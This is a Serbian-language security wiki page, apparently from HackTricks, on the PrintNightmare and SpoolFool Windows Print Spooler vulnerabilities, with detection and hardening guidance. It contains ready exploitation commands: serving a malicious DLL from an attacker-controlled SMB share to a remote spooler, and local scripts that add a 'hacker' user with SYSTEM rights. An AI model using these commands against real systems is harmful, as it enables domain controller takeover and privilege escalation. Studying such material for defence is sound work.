# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare je kolektivno ime dato porodici ranjivosti u Windows **Print Spooler** servisu koje omogućavaju **izvršavanje proizvoljnog koda kao SYSTEM** i, kada je spooler dostupan preko RPC-a, **daljinsko izvršavanje koda (RCE) na kontrolerima domena i serverima za datoteke**. Najčešće korišćeni CVE-ovi su **CVE-2021-1675** (prvobitno klasifikovan kao LPE) i **CVE-2021-34527** (puno RCE). Naknadni problemi kao što su **CVE-2021-34481 (“Point & Print”)** i **CVE-2022-21999 (“SpoolFool”)** dokazuju da je površina napada još uvek daleko od zatvaranja.

---

## 1. Ranjivi komponenti & CVE-ovi

| Godina | CVE | Kratko ime | Primitiv | Napomene |
|--------|-----|------------|----------|----------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Ispravljeno u junu 2021. CU, ali zaobiđeno od strane CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx omogućava autentifikovanim korisnicima da učitaju DLL drajver sa udaljenog dela|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalacija nesigurnog drajvera od strane korisnika koji nisu administratori|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Proizvoljno kreiranje direktorijuma → DLL sadnja – funkcioniše nakon ispravki iz 2021.|

Svi oni zloupotrebljavaju jednu od **MS-RPRN / MS-PAR RPC metoda** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ili odnose poverenja unutar **Point & Print**.

## 2. Tehnike eksploatacije

### 2.1 Kompromitacija daljinskog kontrolera domena (CVE-2021-34527)

Autentifikovani, ali **neprivilegovani** korisnik domena može pokrenuti proizvoljne DLL-ove kao **NT AUTHORITY\SYSTEM** na udaljenom spooleru (često DC) tako što:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popular PoCs uključuju **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) i module Benjamina Delpyja `misc::printnightmare / lsa::addsid` u **mimikatz**.

### 2.2 Lokalno eskaliranje privilegija (bilo koji podržani Windows, 2021-2024)

Isti API se može pozvati **lokalno** da učita drajver iz `C:\Windows\System32\spool\drivers\x64\3\` i postigne SYSTEM privilegije:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – zaobilaženje popravki iz 2021. godine

Microsoft-ova ažuriranja iz 2021. godine blokirala su učitavanje udaljenih drajvera, ali **nisu ojačala dozvole direktorijuma**. SpoolFool koristi parametar `SpoolDirectory` da kreira proizvoljni direktorijum pod `C:\Windows\System32\spool\drivers\`, postavlja payload DLL i prisiljava spooler da ga učita:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Eksploit radi na potpuno ažuriranim Windows 7 → Windows 11 i Server 2012R2 → 2022 pre ažuriranja iz februara 2022.

---

## 3. Detekcija i lov

* **Događajni logovi** – omogućite *Microsoft-Windows-PrintService/Operational* i *Admin* kanale i pratite **Event ID 808** “Print spooler nije uspeo da učita modul dodatka” ili **RpcAddPrinterDriverEx** poruke.
* **Sysmon** – `Event ID 7` (Slika učitana) ili `11/23` (Pisanje/bršenje datoteke) unutar `C:\Windows\System32\spool\drivers\*` kada je roditeljski proces **spoolsv.exe**.
* **Linija procesa** – upozorenja kada god **spoolsv.exe** pokrene `cmd.exe`, `rundll32.exe`, PowerShell ili bilo koju nesigurnu binarnu datoteku.

## 4. Ublažavanje i učvršćivanje

1. **Ažurirajte!** – Primijenite najnovije kumulativno ažuriranje na svakom Windows hostu koji ima instaliranu Print Spooler uslugu.
2. **Onemogućite spooler gde nije potreban**, posebno na domen kontrolerima:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blokirajte udaljene konekcije** dok i dalje omogućavate lokalno štampanje – Grupa politika: `Konfiguracija računara → Administrativne šablone → Štampači → Dozvoli Print Spooler da prihvati klijentske konekcije = Onemogućeno`.
4. **Ograničite Point & Print** tako da samo administratori mogu dodavati drajvere postavljanjem vrednosti registra:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaljna uputstva u Microsoft KB5005652

---

## 5. Povezana istraživanja / alati

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) moduli
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit i izveštaj
* 0patch mikropatchevi za SpoolFool i druge greške u spooleru

---

**Više čitanja (spoljašnje):** Pogledajte blog post o vodiču za 2024. – [Razumevanje PrintNightmare ranjivosti](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Reference

* Microsoft – *KB5005652: Upravljanje novim ponašanjem instalacije podrazumevanog drajvera za Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
